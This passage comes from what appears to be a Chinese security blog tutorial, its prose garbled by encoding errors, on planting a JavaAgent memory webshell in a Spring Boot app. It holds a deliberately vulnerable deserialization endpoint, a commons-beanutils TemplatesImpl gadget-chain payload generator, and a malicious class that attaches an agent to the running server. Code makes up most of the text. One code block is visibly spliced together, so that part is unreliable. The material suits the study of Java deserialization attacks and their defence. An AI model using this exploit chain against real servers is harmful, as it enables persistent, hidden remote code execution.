c.toBytecode();</span><br><span class="line">                c.detach();</span><br><span class="line">                <span class="keyword">return</span> bytes;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>  æ‰“æˆjaråŒ…ï¼š</p><p><a href="https://pic.imgdb.cn/item/64d26ff61ddac507cc0a6ded.jpg" title="image-20230804122643322" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d26ff61ddac507cc0a6ded.jpg" alt="image-20230804122643322"></a></p><p><a href="https://pic.imgdb.cn/item/64d270031ddac507cc0a8fd2.jpg" title="image-20230804122657923" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d270031ddac507cc0a8fd2.jpg" alt="image-20230804122657923"></a></p><p>ä¹‹åæˆ‘ä»¬å†™ä»¥ä¸‹å‡ ä¸ªç±»ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorld</span>  &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Hello</span> <span class="variable">h1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hpackage</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hello</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">Hello</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello World!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;ello();</span><br><span class="line">        h1.Hello();</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">Scanner</span> <span class="variable">sc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">            sc.nextInt();</span><br><span class="line">            <span class="type">Hello</span> <span class="variable">h2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hello</span>();</span><br><span class="line">            h2.Hello();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hello</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">Hello</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello World!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Attach</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            java.io.<span class="type">File</span> <span class="variable">toolsPath</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.File(System.getProperty(<span class="string">&quot;java.home&quot;</span>).replace(<span class="string">&quot;jre&quot;</span>,<span class="string">&quot;lib&quot;</span>) + java.io.File.separator + <span class="string">&quot;tools.jar&quot;</span>);</span><br><span class="line">            System.out.println(toolsPath.toURI().toURL());</span><br><span class="line">            java.net.<span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> toolsPath.toURI().toURL();</span><br><span class="line">            java.net.<span class="type">URLClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.net.URLClassLoader(<span class="keyword">new</span> <span class="title class_">java</span>.net.URL[]&#123;url&#125;);</span><br><span class="line">            Class&lt;?&gt; MyVirtualMachine = classLoader.loadClass(<span class="string">&quot;com.sun.tools.attach.VirtualMachine&quot;</span>);</span><br><span class="line">            Class&lt;?&gt; MyVirtualMachineDescriptor = classLoader.loadClass(<span class="string">&quot;com.sun.tools.attach.VirtualMachineDescriptor&quot;</span>);</span><br><span class="line">            java.lang.reflect.<span class="type">Method</span> <span class="variable">listMethod</span> <span class="operator">=</span> MyVirtualMachine.getDeclaredMethod(<span class="string">&quot;list&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">            java.util.List&lt;Object&gt; list = (java.util.List&lt;Object&gt;) listMethod.invoke(MyVirtualMachine,<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;list.size();i++)&#123;</span><br><span class="line">                <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> list.get(i);</span><br><span class="line">                java.lang.reflect.<span class="type">Method</span> <span class="variable">displayName</span> <span class="operator">=</span> MyVirtualMachineDescriptor.getDeclaredMethod(<span class="string">&quot;displayName&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">                <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> (String) displayName.invoke(o,<span class="literal">null</span>);</span><br><span class="line">                System.out.println(name);</span><br><span class="line">                <span class="keyword">if</span> (name.equals(<span class="string">&quot;org.example.HelloWorld&quot;</span>))&#123;</span><br><span class="line">                    java.lang.reflect.<span class="type">Method</span> <span class="variable">getId</span> <span class="operator">=</span> MyVirtualMachineDescriptor.getDeclaredMethod(<span class="string">&quot;id&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">                    java.lang.<span class="type">String</span> <span class="variable">id</span> <span class="operator">=</span> (java.lang.String) getId.invoke(o,<span class="literal">null</span>);</span><br><span class="line">                    java.lang.reflect.<span class="type">Method</span> <span class="variable">attach</span> <span class="operator">=</span> MyVirtualMachine.getDeclaredMethod(<span class="string">&quot;attach&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;java.lang.String.class&#125;);</span><br><span class="line">                    java.lang.<span class="type">Object</span> <span class="variable">vm</span> <span class="operator">=</span> attach.invoke(o,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;id&#125;);</span><br><span class="line">                    java.lang.reflect.<span class="type">Method</span> <span class="variable">loadAgent</span> <span class="operator">=</span> MyVirtualMachine.getDeclaredMethod(<span class="string">&quot;loadAgent&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;java.lang.String.class&#125;);</span><br><span class="line">                    java.lang.<span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> <span class="string">&quot;/home/rainb0w/codes/java_projects/agent/out/artifacts/agent_jar/agent.jar&quot;</span>;</span><br><span class="line">                    loadAgent.invoke(vm,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;path&#125;);</span><br><span class="line">                    java.lang.reflect.<span class="type">Method</span> <span class="variable">detach</span> <span class="operator">=</span> MyVirtualMachine.getDeclaredMethod(<span class="string">&quot;detach&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">                    detach.invoke(vm,<span class="literal">null</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>tools.jar ä¸ä¼šåœ¨ JVM å¯åŠ¨çš„æ—¶å€™é»˜è®¤åŠ è½½ï¼Œè¿™é‡Œé€šè¿‡URLClassLoaderåŠ è½½tools.jarã€‚attachåˆ°org.example.HelloWorldï¼ŒåŠ è½½agent.jaræ›´æ”¹Helloç±»çš„Helloæ–¹æ³•ï¼Œå°†<code>System.out.println(\&quot;Attach Successful!\&quot;);</code>æ’å…¥åˆ°äº†Helloæ–¹æ³•å‰é¢ã€‚</p><p>æ‰§è¡ŒHelloWorldçš„mainæ–¹æ³•ï¼Œè¾“å‡ºäº†ä¸€æ¬¡Hello Worldï¼š</p><p><a href="https://pic.imgdb.cn/item/64d270101ddac507cc0ab183.jpg" title="image-20230804122327322" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d270101ddac507cc0ab183.jpg" alt="image-20230804122327322"></a></p><p>æ‰§è¡ŒAttachçš„mainæ–¹æ³•åï¼Œéšæ„è¾“å…¥ä¸€ä¸ªæ•°ï¼Œå¯ä»¥çœ‹åˆ°Helloç±»çš„Helloæ–¹æ³•å·²ç»è¢«æ”¹å˜ï¼š</p><p><a href="https://pic.imgdb.cn/item/64d2701c1ddac507cc0ad763.jpg" title="image-20230804123610992" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d2701c1ddac507cc0ad763.jpg" alt="image-20230804123610992"></a></p><p>äº†è§£JavaAgentåï¼Œæˆ‘ä»¬å¯ä»¥æ¥æ‰“å†…å­˜é©¬äº†ã€‚è¿˜è®°å¾—æˆ‘ä»¬åœ¨Filterå†…å­˜é©¬é‚£é‡Œçš„æµç¨‹åˆ†æå—ï¼Ÿåœ¨ç»è¿‡org.apache.catalina.core.ApplicationFilterFactory#createFilterChainåæˆ‘ä»¬å¾—åˆ°äº†ä¸€ä¸ªApplicationFilterChainå¯¹è±¡ï¼Œä¹‹ååˆè°ƒç”¨äº†è¿™ä¸ªApplicationFilterChainå¯¹è±¡çš„doFilterå‡½æ•°ï¼Œå…¶ä¸­æœ‰requestå¯¹è±¡å‚æ•°å’Œresponseå¯¹è±¡å‚æ•°ã€‚å› æ­¤æˆ‘ä»¬å¯ä»¥æ›´æ”¹ApplicationFilterChainç±»çš„doFilterå‡½æ•°ï¼Œå‘å®ƒçš„å‰é¢æ·»åŠ ä¸€äº›æ¶æ„ä»£ç ã€‚</p><h4 id="ååºåˆ—åŒ–æ³¨å…¥-JavaAgent-å‹å†…å­˜é©¬"><a href="#ååºåˆ—åŒ–æ³¨å…¥-JavaAgent-å‹å†…å­˜é©¬" class="headerlink" title="ååºåˆ—åŒ–æ³¨å…¥ JavaAgent å‹å†…å­˜é©¬"></a>ååºåˆ—åŒ–æ³¨å…¥ JavaAgent å‹å†…å­˜é©¬</h4><p>é¦–å…ˆåˆ›å»ºä¸€ä¸ªç®€å•çš„SpringBooté¡¹ç›®ï¼Œå¹¶å¯¼å…¥common-beanutilsä¾èµ–ï¼Œä»¥ä¸‹æ˜¯ä¸€ä¸ªç¤ºä¾‹controllerï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.vul_demo.controllers;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PostMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DeserializeController</span> &#123;</span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="meta">@PostMapping(&quot;/deserialize&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">Vuln</span><span class="params">(<span class="meta">@RequestParam(required = false, name = &quot;bytecodes&quot;)</span> String encodedBytecodes)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line"><span class="comment">//        System.out.println(encodedBytecodes);</span></span><br><span class="line">        <span class="keyword">if</span>(encodedBytecodes == <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Hello, World!&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.println(encodedBytecodes);</span><br><span class="line">            <span class="type">byte</span>[] bytecodes = Base64.getDecoder().decode(encodedBytecodes);</span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytecodes);</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(inputStream);</span><br><span class="line">            objectInputStream.readObject();</span><br><span class="line">            objectInputStream.close();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/index&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;hello world&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello!!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¹‹åç»™å‡ºç”Ÿæˆpayloadçš„ä»£ç ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title function_">getField</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName)</span> &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            field = clazz.getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (NoSuchFieldException ex) &#123;</span><br><span class="line">            <span class="keyword">if</span> (clazz.getSuperclass() != <span class="literal">null</span>)</span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> field;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getpayload</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;</span><br><span class="line">                ClassPool.getDefault().get(AgentTemplatesImpl.class.getName()).toBytecode()</span><br><span class="line">        &#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">BeanComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>();</span><br><span class="line">        <span class="keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;Object&gt;(<span class="number">2</span>, comparator);</span><br><span class="line">        <span class="comment">// stub data for replacement later</span></span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        setFieldValue(comparator, <span class="string">&quot;property&quot;</span>, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">        setFieldValue(queue, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;obj, obj&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> queue;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@org</span>.junit.Test</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test1</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">payload</span> <span class="operator">=</span> getpayload();</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        outputStream.writeObject(payload);</span><br><span class="line">        outputStream.flush();</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">codes</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());</span><br><span class="line">        System.out.println(codes);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ¶æ„æ¨¡æ¿ç±»ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AgentTemplatesImpl</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            java.io.<span class="type">File</span> <span class="variable">toolsPath</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.File(System.getProperty(<span class="string">&quot;java.home&quot;</span>).replace(<span class="string">&quot;jre&quot;</span>,<span class="string">&quot;lib&quot;</span>) + java.io.File.separator + <span class="string">&quot;tools.jar&quot;</span>);</span><br><span class="line">            System.out.println(toolsPath.toURI().toURL());</span><br><span class="line">            java.net.<span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> toolsPath.toURI().toURL();</span><br><span class="line">            java.net.<span class="type">URLClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.net.URLClassLoader(<span class="keyword">new</span> <span class="title class_">java</span>.net.URL[]&#123;url&#125;);</span><br><span class="line">            Class&lt;?&gt; MyVirtualMachine = classLoader.loadClass(<span class="string">&quot;com.sun.tools.attach.VirtualMachine&quot;</span>);</span><br><span class="line">            Class&lt;?&gt; MyVirtualMachineDescriptor = classLoader.loadClass(<span class="string">&quot;com.sun.tools.attach.VirtualMachineDescriptor&quot;</span>);</span><br><span class="line">            java.lang.reflect.<span class="type">Method</span> <span class="variable">listMethod</span> <span class="operator">=</span> MyVirtualMachine.getDeclaredMethod(<span class="string">&quot;list&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">            java.util.List&lt;Object&gt; list = (java.util.List&lt;Object&gt;) listMethod.invoke(MyVirtualMachine,<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;list.size();i++)&#123;</span><br><span class="line">                <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> list.get(i);</span><br><span class="line">                java.lang.reflect.<span class="type">Method</span> <span class="variable">displayName</span> <span class="operator">=</span> MyVirtualMachineDescriptor.getDeclaredMethod(<span class="string">&quot;displayName&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">                <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> (String) displayName.invoke(o,<span class="literal">null</span>);</span><br><span class="line">                System.out.println(name);</span><br><span class="line">                <span class="keyword">if</span> (name.equals(<span class="string">&quot;com.example.vul_demo.VulDemoApplication&quot;</span>))&#123;</span><br><span class="line">                    java.lang.reflect.<span class="type">Method</span> <span class="variable">getId</span> <span class="operator">=</span> MyVirtualMachineDescriptor.getDeclaredMethod(<span class="string">&quot;id&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">                    java.lang.<span class="type">String</span> <span class="variable">id</span> <span class="operator">=</span> (java.lang.String) getId.invoke(o,<span class="literal">null</span>);</span><br><span class="line">                    java.lang.reflect.<span class="type">Method</span> <span class="variable">attach</span> <span class="operator">=</span> MyVirtualMachine.getDeclaredMethod(<span class="string">&quot;attach&quot;</span>,<span class="keyword">new</span> <span class="title 